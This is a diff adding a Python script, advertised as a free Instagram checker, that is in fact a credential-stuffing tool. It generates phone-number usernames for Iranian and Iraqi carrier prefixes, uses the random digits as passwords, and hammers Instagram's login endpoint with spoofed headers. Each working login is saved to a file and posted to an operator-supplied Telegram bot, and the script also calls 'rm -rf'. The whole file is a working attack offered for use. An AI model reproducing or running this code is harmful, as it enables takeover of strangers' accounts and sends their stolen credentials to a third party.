@@ -1,0 +1,209 @@
+
+
+# coder : exec - warrior
+# github : 6f8
+# instagram : gxp6
+# telegram : ysysd
+# Dont Give Up
+
+
+import os,time
+from time import sleep
+W = "\033[0m";R = '\033[31;1m';B = "\033[1;90m"; C = "\033[1;97m";E = "\033[1;92m"
+
+Banner2 = f"""
+{R}.%%%%%...%%......%%.....
+{R}.%%..%%..%%......%%.....
+{R}.%%..%%..%%......%%.....
+{R}.%%..%%..%%......%%.....
+{R}.%%%%%...%%%%%%..%%%%%%.
+"""
+for warrior in Banner2.splitlines():
+    time.sleep(0.05)
+    print(warrior)
+
+lib = input("""
+\033[1;97m(\033[31;1m*\033[1;97m) \033[1;97mDownload lib \033[31;1m& \033[1;97mupdate
+\033[1;97m(\033[31;1m⌯\033[1;97m) \033[1;97mPlease Choose :\033[1;92m """)
+
+if lib == "*":
+    os.system("pip install requests")
+    time.sleep(0.5)
+    os.system("clear")
+    os.system("pip install user_agent")
+    time.sleep(0.5)
+    os.system("clear")
+    pass
+else:
+    os.system("clear")
+    pass
+
+def logo():    
+    Banner = f"""
+{E}     .########.##.....##.########..######.
+{E}     .##........##...##..##.......##....##
+{E}     .##.........##.##...##.......##......
+{E}     .######......###....######...##......
+{E}     .##.........##.##...##.......##......
+{E}     .##........##...##..##.......##....##
+{E}     .########.##.....##.########..######. 
+
+{R}           THIS TOOL FREE IG CHECKER          
+{R}             ↿ {C}MAME {R}⇂     {E}⇝   {C}EXEC
+{R}            ↿ {C}GITHUB {R}⇂    {E}⇝   {C}6F8
+{R}           ↿ {C}TELEGRAM {R}⇂   {E}⇝   {C}YSYSD
+{R}           ↿ {C}INSTAGRAM {R}⇂  {E}⇝   {C}GXP6
+\n"""
+    for warrior in Banner.splitlines():
+        time.sleep(0.05)
+        print(warrior)
+logo()
+
+libx = input("""
+\033[1;97m(\033[31;1m1\033[1;97m)\033[1;97m Hunting Iran
+\033[1;97m(\033[31;1m2\033[1;97m)\033[1;97m Hunting another Iran
+\033[1;97m(\033[31;1m3\033[1;97m)\033[1;97m Hunting Asia
+\033[1;97m(\033[31;1m4\033[1;97m)\033[1;97m Hunting Zain
+\033[1;97m(\033[31;1m5\033[1;97m)\033[1;97m Hunting Kork
+
+\033[1;97m(\033[1;92m⌯\033[1;97m) \033[1;97mPlease Choose :\033[1;92m """)
+
+
+import requests,random,time,os
+from user_agent import *
+
+
+ID = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your ID Bot : "+E)
+token = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your Token Bot : "+E)
+
+if libx == "1":
+    def login():
+        os.system(f"rm -rf")
+        logo()
+        av, er, at = 0,0,0
+        while True:
+            time.sleep(2)
+            N = "09876543221"
+            R = ''.join(random.choice(N)for t in range(7))
+            username = '98912'+R
+            password = R
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
+            data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
+            req = requests.post(url,headers=headers,data=data).text
+            if "userId" in req:            
+                at += 1
+                av += 1
+                time.sleep(0.50)
+                open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
+                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n Username : {username} \n Password : {password}')
+            else:
+                er += 1
+                time.sleep(0.50)
+                print(f"\r \033[1;92m(Username) : \033[31;1m{username} ⋮ \033[1;92m(Found):{av} ⋮ \033[1;92m(Password) : \033[31;1m{password} ⋮ \033[1;92m(Error):{er}\033[1;90m", end="")
+            
+if libx == "2":
+    def login():
+        os.system(f"rm -rf")
+        logo()
+        av, er, at = 0,0,0
+        while True:
+            time.sleep(2)
+            N = "09876543221"
+            R = ''.join(random.choice(N)for t in range(7))
+            username = '98913'+R
+            password = R
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
+            data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
+            req = requests.post(url,headers=headers,data=data).text
+            if "userId" in req:            
+                at += 1
+                av += 1
+                time.sleep(0.50)
+                open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
+                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n Username : {username} \n Password : {password}')
+            else:
+                er += 1
+                time.sleep(0.50)
+                print(f"\r \033[1;92m(Username) : \033[31;1m{username} ⋮ \033[1;92m(Found):{av} ⋮ \033[1;92m(Password) : \033[31;1m{password} ⋮ \033[1;92m(Error):{er}\033[1;90m", end="")
+
+if libx == "3":
+    def login():
+        os.system(f"rm -rf")
+        logo()
+        av, er, at = 0,0,0
+        while True:
+            time.sleep(2)
+            N = "09876543221"
+            R = ''.join(random.choice(N)for t in range(7))
+            username = '9647701'+R
+            password = R
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
+            data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
+            req = requests.post(url,headers=headers,data=data).text
+            if "userId" in req:            
+                at += 1
+                av += 1
+                time.sleep(0.50)
+                open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
+                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n Username : {username} \n Password : {password}')
+            else:
+                er += 1
+                time.sleep(0.50)
+                print(f"\r \033[1;92m(Username) : \033[31;1m{username} ⋮ \033[1;92m(Found):{av} ⋮ \033[1;92m(Password) : \033[31;1m{password} ⋮ \033[1;92m(Error):{er}\033[1;90m", end="")
+            
+if libx == "4":
+    def login():
+        os.system(f"rm -rf")
+        logo()
+        av, er, at = 0,0,0
+        while True:
+            time.sleep(2)
+            N = "09876543221"
+            R = ''.join(random.choice(N)for t in range(7))
+            username = '9647801'+R
+            password = R
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
+            data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
+            req = requests.post(url,headers=headers,data=data).text
+            if "userId" in req:            
+                at += 1
+                av += 1
+                time.sleep(0.50)
+                open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
+                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n Username : {username} \n Password : {password}')
+            else:
+                er += 1
+                time.sleep(0.50)
+                print(f"\r \033[1;92m(Username) : \033[31;1m{username} ⋮ \033[1;92m(Found):{av} ⋮ \033[1;92m(Password) : \033[31;1m{password} ⋮ \033[1;92m(Error):{er}\033[1;90m", end="")
+
+if libx == "5":
+    def login():
+        os.system(f"rm -rf")
+        logo()
+        av, er, at = 0,0,0
+        while True:
+            time.sleep(2)
+            N = "09876543221"
+            R = ''.join(random.choice(N)for t in range(7))
+            username = '9647501'+R
+            password = R
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
+            data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
+            req = requests.post(url,headers=headers,data=data).text
+            if "userId" in req:            
+                at += 1
+                av += 1
+                time.sleep(0.50)
+                open("Good.txt","a").write(f"Username : {username}\nPassword : {password} \n\n")
+                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n Username : {username} \n Password : {password}')
+            else:
+                er += 1
+                time.sleep(0.50)
+                print(f"\r \033[1;92m(Username) : \033[31;1m{username} ⋮ \033[1;92m(Found):{av} ⋮ \033[1;92m(Password) : \033[31;1m{password} ⋮ \033[1;92m(Error):{er}\033[1;90m", end="")
+
+login()                
